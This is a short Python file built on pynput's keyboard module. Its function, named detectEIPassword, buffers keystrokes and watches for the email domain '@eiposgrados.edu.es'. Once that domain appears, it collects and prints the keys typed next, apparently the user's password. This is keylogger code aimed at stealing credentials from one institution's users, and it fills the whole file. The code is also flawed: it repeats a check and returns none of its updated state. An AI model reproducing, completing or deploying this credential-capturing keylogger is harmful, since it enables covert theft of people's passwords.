from pynput.keyboard import Key


def detectEIPassword(key, buffer, wordFlag, word):
    if (key != Key.esc and key != Key.enter and key != Key.esc and key != Key.space):
        if (key == Key.backspace):
            buffer = buffer[:-1]
        else:
            if wordFlag:
                word = word + '{0}'.format(key)
                print(word)
            else:
                if word != '':
                    print(word)
                word = ''
                buffer = buffer + '{0}'.format(key)
    else:
        buffer = ''
    print("====BUFFER====")
    print(buffer)
    print("=====WORD====")
    print(word)
    if '@eiposgrados.edu.es' in buffer:
        wordFlag = True
    else:
        wordFlag = False
